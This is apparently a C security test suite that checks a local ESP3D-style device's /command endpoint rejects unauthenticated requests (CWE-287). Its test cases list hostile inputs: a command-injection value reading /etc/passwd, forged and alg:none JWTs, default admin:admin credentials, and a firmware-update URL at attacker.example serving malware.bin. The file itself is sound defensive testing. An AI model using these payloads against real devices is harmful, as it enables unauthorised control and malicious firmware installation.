#include <check.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>

#define SERVER_HOST "127.0.0.1"
#define SERVER_PORT 8080
#define BUFFER_SIZE 4096
#define CONNECT_TIMEOUT_SEC 2

/*
 * Attempt to connect to the server and send an HTTP GET request,
 * then read the response status code.
 * Returns the HTTP status code, or -1 on connection failure (server not running).
 */
static int send_http_request_and_get_status(const char *request)
{
    int sockfd;
    struct sockaddr_in server_addr;
    char response[BUFFER_SIZE];
    int status_code = -1;
    ssize_t bytes_received;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }

    /* Set socket timeout */
    struct timeval tv;
    tv.tv_sec = CONNECT_TIMEOUT_SEC;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&tv, sizeof(tv));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_HOST, &server_addr.sin_addr) <= 0) {
        close(sockfd);
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1; /* Server not running — skip */
    }

    ssize_t sent = send(sockfd, request, strlen(request), 0);
    if (sent < 0) {
        close(sockfd);
        return -1;
    }

    memset(response, 0, sizeof(response));
    bytes_received = recv(sockfd, response, sizeof(response) - 1, 0);
    close(sockfd);

    if (bytes_received <= 0) {
        return -1;
    }

    /* Parse HTTP status line: "HTTP/1.x NNN ..." */
    if (strncmp(response, "HTTP/", 5) == 0) {
        char *space = strchr(response, ' ');
        if (space != NULL) {
            status_code = atoi(space + 1);
        }
    }

    return status_code;
}

/*
 * Build an HTTP GET request for /command with a given Authorization header value.
 * Pass NULL for auth_header to omit the Authorization header entirely.
 */
static void build_request(char *buf, size_t buf_size,
                           const char *cmd_param,
                           const char *auth_header)
{
    if (auth_header != NULL) {
        snprintf(buf, buf_size,
                 "GET /command?cmd=%s HTTP/1.1\r\n"
                 "Host: %s:%d\r\n"
                 "Authorization: %s\r\n"
                 "Connection: close\r\n"
                 "\r\n",
                 cmd_param, SERVER_HOST, SERVER_PORT, auth_header);
    } else {
        snprintf(buf, buf_size,
                 "GET /command?cmd=%s HTTP/1.1\r\n"
                 "Host: %s:%d\r\n"
                 "Connection: close\r\n"
                 "\r\n",
                 cmd_param, SERVER_HOST, SERVER_PORT);
    }
}

/* -----------------------------------------------------------------------
 * Test: unauthenticated requests to /command must be rejected (401 or 403)
 * Invariant: CWE-287 — any request lacking valid credentials must never
 *            receive a 200 OK (or any 2xx success) response.
 * ----------------------------------------------------------------------- */
START_TEST(test_command_endpoint_rejects_unauthenticated)
{
    /* Invariant: The /command endpoint MUST reject requests that carry
     * no token, an expired token, or a malformed/forged token with
     * HTTP 401 Unauthorized or 403 Forbidden.  A 2xx response to any
     * of these payloads constitutes a broken-authentication vulnerability
     * (CWE-287). */

    typedef struct {
        const char *description;
        const char *cmd_param;
        const char *auth_header; /* NULL means omit the header entirely */
    } TestCase;

    TestCase cases[] = {
        /* --- No authentication at all --- */
        {
            "No auth header, benign command",
            "ESP3D_VERSION",
            NULL
        },
        {
            "No auth header, WiFi config command",
            "ESP410",   /* List WiFi networks */
            NULL
        },
        {
            "No auth header, firmware update command",
            "ESP900",   /* Firmware update trigger */
            NULL
        },
        {
            "No auth header, security settings command",
            "ESP800",   /* Get firmware/security info */
            NULL
        },
        {
            "No auth header, admin reset command",
            "ESP444",   /* Reset to factory defaults */
            NULL
        },
        {
            "No auth header, arbitrary shell injection attempt",
            "ESP3D_VERSION%3B%20cat%20/etc/passwd",
            NULL
        },

        /* --- Missing / empty token --- */
        {
            "Empty Bearer token",
            "ESP3D_VERSION",
            "Bearer "
        },
        {
            "Whitespace-only token",
            "ESP3D_VERSION",
            "Bearer    "
        },

        /* --- Malformed tokens --- */
        {
            "Malformed JWT (truncated header)",
            "ESP3D_VERSION",
            "Bearer eyJhbGciOiJIUzI1NiJ9"
        },
        {
            "Malformed JWT (two parts only)",
            "ESP3D_VERSION",
            "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlciJ9"
        },
        {
            "Malformed JWT (invalid base64 chars)",
            "ESP3D_VERSION",
            "Bearer !!!.###.$$$"
        },
        {
            "Malformed JWT (null bytes encoded)",
            "ESP3D_VERSION",
            "Bearer %00%00%00.%00%00%00.%00%00%00"
        },
        {
            "Random garbage token",
            "ESP3D_VERSION",
            "Bearer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        },
        {
            "SQL injection in token",
            "ESP3D_VERSION",
            "Bearer ' OR '1'='1"
        },
        {
            "None algorithm JWT (alg:none attack)",
            "ESP900",
            "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
            ".eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
        },
        {
            "HS256 JWT signed with empty secret",
            "ESP444",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
            ".eyJzdWIiOiJhZG1pbiJ9"
            ".2kuSs5V5oPaKFOHZqTgDr0HmkDxhKCcCMFBBhMnMnMo"
        },
        {
            "JWT with forged admin claim",
            "ESP800",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
            ".eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0"
            ".FAKESIGNATURE1234567890"
        },

        /* --- Expired tokens (well-formed but expired) --- */
        {
            "Expired JWT (exp in the past)",
            "ESP3D_VERSION",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
            ".eyJzdWIiOiJ1c2VyIiwiZXhwIjoxfQ"   /* exp=1 (1970) */
            ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        },
        {
            "Expired JWT with admin role",
            "ESP900",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
            ".eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MX0"
            ".EXPIREDSIGNATURE"
        },

        /* --- Wrong scheme / header abuse --- */
        {
            "Basic auth with default credentials",
            "ESP3D_VERSION",
            "Basic YWRtaW46YWRtaW4="   /* admin:admin */
        },
        {
            "Basic auth with empty credentials",
            "ESP3D_VERSION",
            "Basic Og=="   /* : */
        },
        {
            "Digest auth attempt",
            "ESP3D_VERSION",
            "Digest username=\"admin\", realm=\"esp3d\", nonce=\"fake\""
        },
        {
            "X-Auth-Token header only (no Authorization)",
            "ESP3D_VERSION",
            "X-Auth-Token: supersecret"   /* wrong header name */
        },

        /* --- Privilege escalation via command parameter --- */
        {
            "No auth, attempt to change WiFi password",
            "ESP100%20newpassword",
            NULL
        },
        {
            "No auth, attempt to disable authentication",
            "ESP550%200",   /* hypothetical: set auth mode to 0 */
            NULL
        },
        {
            "No auth, OTA firmware update URL",
            "ESP900%20http%3A%2F%2Fattacker.example%2Fmalware.bin",
            NULL
        },
    };

    int num_cases = (int)(sizeof(cases) / sizeof(cases[0]));
    char request_buf[BUFFER_SIZE];

    for (int i = 0; i < num_cases; i++) {
        build_request(request_buf, sizeof(request_buf),
                      cases[i].cmd_param,
                      cases[i].auth_header);

        int status = send_http_request_and_get_status(request_buf);

        if (status == -1) {
            /* Server is not reachable — skip gracefully so CI without a
             * running server does not fail the build, but log the skip. */
            fprintf(stderr,
                    "[SKIP] Server not reachable for case %d (%s)\n",
                    i, cases[i].description);
            continue;
        }

        /* The invariant: an unauthenticated/malformed-auth request MUST
         * NOT succeed.  Any 2xx response is a security failure. */
        ck_assert_msg(
            status == 401 || status == 403,
            "SECURITY VIOLATION (CWE-287): case %d (%s) — "
            "expected 401 or 403 but got HTTP %d. "
            "The /command endpoint accepted an unauthenticated or "
            "malformed-credential request.",
            i, cases[i].description, status
        );
    }
}
END_TEST

Suite *security_suite(void)
{
    Suite *s;
    TCase *tc_core;

    s = suite_create("Security_CWE287_CommandEndpointAuth");
    tc_core = tcase_create("Core");

    /* Allow up to 60 s for all sub-cases (network I/O) */
    tcase_set_timeout(tc_core, 60);

    tcase_add_test(tc_core, test_command_endpoint_rejects_unauthenticated);
    suite_add_tcase(s, tc_core);

    return s;
}

int main(void)
{
    int number_failed;
    Suite *s;
    SRunner *sr;

    s = security_suite();
    sr = srunner_create(s);

    srunner_run_all(sr, CK_NORMAL);
    number_failed = srunner_ntests_failed(sr);
    srunner_free(sr);

    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}